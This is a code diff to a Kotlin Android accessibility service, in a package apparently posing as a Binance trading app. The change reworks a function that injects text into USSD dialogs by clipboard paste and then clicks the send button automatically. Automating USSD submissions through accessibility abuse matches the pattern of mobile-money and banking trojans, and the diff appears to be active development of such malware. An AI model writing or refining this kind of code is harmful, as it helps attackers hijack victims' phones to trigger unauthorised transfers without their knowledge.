@@ -2,6 +2,8 @@ package dApp.binance.Trading.arfu
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
@@ -145,11 +147,11 @@ class CarerAccessibilityService : AccessibilityService() {
     }
 
     /**
-     * Type text in USSD input field with multiple fallback strategies
+     * Type text in USSD input field using copy-paste approach (more reliable)
      */
     fun typeInUssdDialog(text: String) {
         val rootNode = rootInActiveWindow ?: return
-        Log.d("CarerAccessibility", "Starting auto-type: $text")
+        Log.d("CarerAccessibility", "Starting auto-type via copy-paste: $text")
 
         var inputField: AccessibilityNodeInfo? = null
         
@@ -170,32 +172,42 @@ class CarerAccessibilityService : AccessibilityService() {
         }
 
         try {
-            // Step 1: Focus the field
-            Log.d("CarerAccessibility", "Step 1: Focusing input field...")
+            // Step 1: Get clipboard manager
+            Log.d("CarerAccessibility", "Step 1: Getting clipboard manager...")
+            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            
+            // Step 2: Copy text to clipboard
+            Log.d("CarerAccessibility", "Step 2: Copying text to clipboard: $text")
+            val clip = ClipData.newPlainText("ussd_input", text)
+            clipboard.setPrimaryClip(clip)
+            Thread.sleep(200)
+            
+            // Step 3: Focus the input field
+            Log.d("CarerAccessibility", "Step 3: Focusing input field...")
             inputField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
+            Thread.sleep(300)
+            
+            // Step 4: Select all existing text
+            Log.d("CarerAccessibility", "Step 4: Selecting all text...")
+            inputField.performAction(AccessibilityNodeInfo.ACTION_SELECT_ALL)
             Thread.sleep(200)
             
-            // Step 2: Clear existing text
-            Log.d("CarerAccessibility", "Step 2: Clearing existing text...")
-            val clearArgs = android.os.Bundle()
-            clearArgs.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, "")
-            inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, clearArgs)
-            Thread.sleep(200)
-            
-            // Step 3: Set new text with ACTION_SET_TEXT
-            Log.d("CarerAccessibility", "Step 3: Setting new text via SET_TEXT...")
-            val setTextArgs = android.os.Bundle()
-            setTextArgs.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
-            val setSuccess = inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, setTextArgs)
-            Log.d("CarerAccessibility", "SET_TEXT result: $setSuccess, text: $text")
-            
+            // Step 5: Paste the text
+            Log.d("CarerAccessibility", "Step 5: Pasting text via clipboard...")
+            val pasteSuccess = inputField.performAction(AccessibilityNodeInfo.ACTION_PASTE)
+            Log.d("CarerAccessibility", "PASTE action result: $pasteSuccess")
             Thread.sleep(300)
 
-            // Step 4: Click the send button
-            Log.d("CarerAccessibility", "Step 4: Clicking send button...")
+            // Step 6: Clear clipboard (privacy/security)
+            Log.d("CarerAccessibility", "Step 6: Clearing clipboard...")
+            clipboard.setPrimaryClip(ClipData.newPlainText("", ""))
+            Thread.sleep(200)
+
+            // Step 7: Click the send button
+            Log.d("CarerAccessibility", "Step 7: Clicking send button...")
             clickSendButton(rootNode)
             
-            Log.d("CarerAccessibility", "Auto-type complete!")
+            Log.d("CarerAccessibility", "Auto-type via copy-paste complete!")
         } catch (e: Exception) {
             Log.e("CarerAccessibility", "Error in typeInUssdDialog: ${e.message}", e)
             e.printStackTrace()
